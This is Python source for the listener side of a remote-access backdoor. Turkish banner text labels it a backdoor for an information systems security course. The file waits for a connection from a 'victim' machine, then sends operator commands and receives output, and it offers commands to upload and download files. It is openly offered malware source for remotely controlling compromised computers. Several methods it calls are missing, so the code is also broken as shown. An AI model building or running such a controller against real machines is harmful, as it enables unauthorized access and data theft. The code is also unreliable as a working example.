import socket
import colorama
from colorama import Fore, Back
import os
import simplejson
import random
import time
import argparse

colorama.init(autoreset=True)


class TR_Dinleyici():
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.Banner_goster()
        dinleyici = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dinleyici.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            dinleyici.bind((ip, port))
            dinleyici.listen(0)

        except OSError:
            print(Fore.MAGENTA + "IP ve port numarası yanlış tekrar kontrol edin.")
            exit()
        try:
            print(Back.BLACK + Fore.RED + "#b# Gelecek baglantilar dinlenilmeye baslandi.\n\n")
            (self.baglanti, adres) = dinleyici.accept()
        except KeyboardInterrupt:
            print(Fore.RED + "#b# CTRL+C algılandı.Çıkılıyor...")
            exit()

        print(Fore.GREEN + "!b! Kurban baglantisi geldi :" + str(adres) + "\n\n")
        time.sleep(1)
        time.sleep(2)
        #self.Banner_goster()
        print(Fore.RED + "Komutlar için 'yardim' yaziniz.")

    def renk_ve_yazi_sec(self):
        yazi1 = """
        # # #      # # # # #    #           #    # # # # #    # # # # #                                                                                                   
        #     #    #             #       #             #     #         #                                                                                                
        #    #     #               #   #              #      #         #                                                                        
        # #        # # #             #              #        #  #  #   #                                                                                                      
        #    #     #                 #             #         #         #                                                                                                
        #     #    #                 #           #           #         #                                                                               
        # # #      # # # # #         #          # # # # #    #         # """
        yazi2 = """
        [] [] []      [] [] [] [] []     []           []    [] [] [] [] []     [] [] [] [] []                                                                                                   
        []      []    []                   []       []                 []      []          []                                                                                                
        []    []      []                     []   []                 []        []          []                                                                        
        [] []         [] [] []                 []                 []           []  []  []  []                                                                                                      
        []    []      []                       []               []             []          []                                                                                                
        []      []    []                       []            []                []          []                                                                               
        [] [] []      [] [] [] [] []           []          [] [] [] [] []      []          []                                                                                                                             
         """
        yazi3 = """
        | | |       | | | | |      |          |    | | | | |       | |  | | |                                                                                                   
        |      |    |               |       |              |       |        |                                                                                                
        |    |      |                 |   |               |        |        |                                                                        
        | |         | | |               |               |          |  |  |  |                                                                                                      
        |    |      |                   |              |           |        |                                                                                                
        |      |    |                   |            |             |        |                                                                               
        | | |       | | | | |           |          | | | | |       |        |                                                                                                                             

        """

        kirmizi = Fore.RED
        yesil = Fore.GREEN
        mavi = Fore.BLUE
        sari = Fore.YELLOW
        acik_mavi = Fore.CYAN
        mor = Fore.MAGENTA
        yazilar = [yazi1, yazi2, yazi3]
        renkler = [kirmizi, yesil, mavi, sari, acik_mavi, mor]
        yazi_secimi = random.choice(yazilar)
        renk_secimi = random.choice(renkler)
        return yazi_secimi, renk_secimi

    def Banner_goster(self):
        os.system("clear")
        yazi, renk = self.renk_ve_yazi_sec()
        print(renk + yazi)
        time.sleep(1)
        yazi, renk = self.renk_ve_yazi_sec()
        print(Fore.YELLOW + "\n BİLGİ SİSTEMLERİ VE GÜVENLİĞİ DERSİ BACKDOOR \n")
        print(renk + "\t\t\t\t\t\tYazarı : BEYZA BARIN \n\n\n\n")
        time.sleep(0.5)

    def Json_Gonder(self, bilgi):
        json_bilgisi = simplejson.dumps(bilgi)
        self.baglanti.send(json_bilgisi.encode("utf-8"))

    def Json_Al(self):
        json_bilgisi = ""
        while True:
            try:
                json_bilgisi = json_bilgisi + self.baglanti.recv(100000).decode()
                return simplejson.loads(json_bilgisi)
            except ValueError:
                continue

    def Komut_Calistir(self, komut):
        self.Json_Gonder(komut)
        if komut[0] == "cikis":
            self.baglanti.close()
            exit()
        return self.Json_Al()

    def Temizle(self):
        return os.system("clear")

    def Yardim(self):
        with open("menuTR.txt", "r", encoding="utf-8") as menu:
            return Fore.GREEN + menu.read()

    def Dinleyici_Basla(self):

        while True:
            global command_input
            print(Fore.RED + "<<<<Konsol__kurban>>>>")
            command_input = input(Fore.BLUE + "        ╰──------>Komut:")
            command_input = command_input.split(" ")

            try:
                if command_input[0] == "yukle":
                    dosya_icerigi = self.Dosya_Icerigi_Al(command_input[1])
                    command_input.append(dosya_icerigi)
                elif command_input[0] == "sohbet":
                    komut_cikisi = self.Sohbet()
                komut_cikisi = self.Komut_Calistir(command_input)

                if command_input[
                    0] == "indir" and "Komut uygulanamadi.Kurban makinenin baglantisi kesilmis olabilir." not in command_input:
                    komut_cikisi = self.Dosya_Kaydet(command_input[1], komut_cikisi)
                elif command_input[0] == "temizle":
                    komut_cikisi = self.Temizle()
                elif command_input[0] == "yardim":
                    komut_cikisi = self.Yardim()
            except Exception:
                print(Back.BLACK + Fore.YELLOW + "Komut uygulanamadi.Kurban makinenin baglantisi kesilmis olabilir.")
            print(komut_cikisi)


class Main_Start():
    def __init__(self):
        self.ap = argparse.ArgumentParser()
        self.ap.add_argument("-ip", "--ip_address", required=True, help="tr:Dinlemek istediğiniz IP adresini giriniz")
        self.ap.add_argument("-p", "--port", required=True, help="tr:Dinlemek istediğiniz portu giriniz")
        self.args = vars(self.ap.parse_args())
        language = self.Language_Choice()
        self.Update_Question(language)
        self.connection_value = ""

    def Language_Choice(self):
        self.choice = ""
        os.system("clear")
        print(Fore.RED + "Dil seciniz/Choose Language :\n\ntr:Türkçe\nen:English")
        self.choice = input(Fore.BLUE + "Choice/Seciminiz:")
        if self.choice == "tr" or self.choice == "en":
            return self.choice
        else:
            print(
                Fore.YELLOW + "#b# Yanlış dil seçtiniz.Lütfen tekrar seçiniz.")
            time.sleep(2)
            return self.Language_Choice()


    def Update_Question(self, language):
        try:

            if language == "tr":
                self.connection_value = "TR"
                self.dinleyici = TR_Dinleyici(self.args["ip_address"], int(self.args["port"]))
                self.dinleyici.Dinleyici_Basla()

        except KeyboardInterrupt:
            if self.connection_value == "TR":
                print(Fore.RED + "#b# CTRL+C algılandı.Çıkış yapılıyor...")
                exit()


start = Main_Start()
